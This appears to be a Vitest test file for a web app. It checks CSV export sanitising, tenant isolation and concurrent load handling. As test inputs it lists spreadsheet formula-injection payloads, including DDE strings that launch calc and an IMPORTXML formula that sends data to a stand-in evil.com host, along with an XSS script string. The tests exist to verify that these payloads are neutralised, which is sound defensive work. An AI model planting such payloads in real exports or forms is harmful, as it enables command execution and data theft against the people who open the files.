import { describe, expect, it } from 'vitest';
import { csvCell, submissionsToCsv } from '../../app/projects/projectHelpers';
import { createLocalServices } from '../../data/localServices';
import { SubmissionRecord } from '../../data/services';
import { blankProject } from '../../templates';

describe('Security & Hack-Free Defenses', () => {
  it('neutralizes CSV / Spreadsheet formula injection attacks', () => {
    // Attack payloads that attempt DDE / formula execution in Excel/Google Sheets
    const maliciousPayloads = [
      '=cmd|\'/C calc\'!A0',
      '+cmd|\'/C calc\'!A0',
      '-cmd|\'/C calc\'!A0',
      '@SUM(1+1)*cmd|\'/C calc\'!A0',
      '\t=2+2',
      '\r=1+1',
    ];

    for (const payload of maliciousPayloads) {
      const sanitized = csvCell(payload);
      // Must be prefixed with a single quote to force plain text rendering
      expect(sanitized.startsWith(`"'`)).toBe(true);
    }
  });

  it('escapes quotes and special characters in CSV cells properly', () => {
    const complexString = 'Hello "World", with comma and \n newlines';
    const cell = csvCell(complexString);
    expect(cell).toBe('"Hello ""World"", with comma and \n newlines"');
  });

  it('generates fully shielded CSV submissions from arbitrary visitor inputs', () => {
    const rawSubmissions: SubmissionRecord[] = [
      {
        id: 'sub-1',
        createdAt: '2026-11-18T10:00:00Z',
        data: {
          name: '=IMPORTXML("http://evil.com/leak","//text")',
          email: 'test@victim.com',
          feedback: '<script>alert("xss")</script>',
        },
      },
    ];

    const csvOutput = submissionsToCsv(rawSubmissions);
    expect(csvOutput).toContain(`"'=IMPORTXML`);
    expect(csvOutput).not.toContain('\n=IMPORTXML');
  });

  it('enforces multi-tenant workspace isolation and rejects cross-organization leaks', async () => {
    const services = createLocalServices();

    // Org 1 and Org 2
    const org1Id = 'org-alpha-123';
    const org2Id = 'org-beta-456';

    const p1 = blankProject('website', org1Id, 'Alpha Secret Portal');
    const p2 = blankProject('website', org2Id, 'Beta Confidential Roadmap');

    const p1Id = await services.projects.create(p1);
    const p2Id = await services.projects.create(p2);

    // List projects for Org 1
    const org1Projects = await services.projects.list(org1Id);
    expect(org1Projects.some((p) => p.id === p1Id)).toBe(true);
    expect(org1Projects.some((p) => p.id === p2Id)).toBe(false);

    // List projects for Org 2
    const org2Projects = await services.projects.list(org2Id);
    expect(org2Projects.some((p) => p.id === p2Id)).toBe(true);
    expect(org2Projects.some((p) => p.id === p1Id)).toBe(false);
  });
});

describe('Concurrency & High-Load Handling', () => {
  it('handles 100 concurrent project operations without race conditions or corruption', async () => {
    const services = createLocalServices();
    const testOrgId = 'org-load-test-999';

    // Spawn 100 concurrent creations
    const projectPromises = Array.from({ length: 100 }).map((_, index) => {
      const p = blankProject('page', testOrgId, `Concurrent Project #${index + 1}`);
      return services.projects.create(p);
    });

    const createdIds = await Promise.all(projectPromises);
    expect(createdIds.length).toBe(100);

    // Verify all 100 distinct IDs were created
    const uniqueIds = new Set(createdIds);
    expect(uniqueIds.size).toBe(100);

    // Verify all 100 are retrievable under load
    const fetchedProjects = await services.projects.list(testOrgId);
    expect(fetchedProjects.length).toBe(100);
  });

  it('handles 50 concurrent form submissions seamlessly', async () => {
    const services = createLocalServices();
    const testOrgId = 'org-form-test-888';
    const formProject = blankProject('form', testOrgId, 'Production Feedback Form');
    const projectId = await services.projects.create(formProject);
    await services.publishing.publish(projectId);

    // Simulate 50 concurrent visitors submitting forms simultaneously
    const submissionPromises = Array.from({ length: 50 }).map((_, idx) => {
      return services.publicApi.submitForm(
        projectId,
        {
          name: `User ${idx}`,
          email: `visitor${idx}@acme.com`,
          rating: (idx % 5) + 1,
        },
        `visitor-cookie-${idx}`,
      );
    });

    await Promise.all(submissionPromises);

    const submissions = await services.forms.listSubmissions(projectId);
    expect(submissions.length).toBe(50);
  });

  it('handles 50 concurrent analytics event batches safely', async () => {
    const services = createLocalServices();
    const projectId = 'proj-load-analytics-202';

    const eventPromises = Array.from({ length: 50 }).map((_, idx) => {
      return services.publicApi.trackEvents(projectId, [
        { type: 'impression', visitorId: `v-${idx}`, device: 'desktop' },
        { type: 'step_completed', visitorId: `v-${idx}`, metadata: { step: 1 } },
      ]);
    });

    await Promise.all(eventPromises);

    // Analytics summary should reflect all tracked events
    const summary = await services.analytics.summary('any-org', 30);
    expect(Array.isArray(summary)).toBe(true);
  });
});
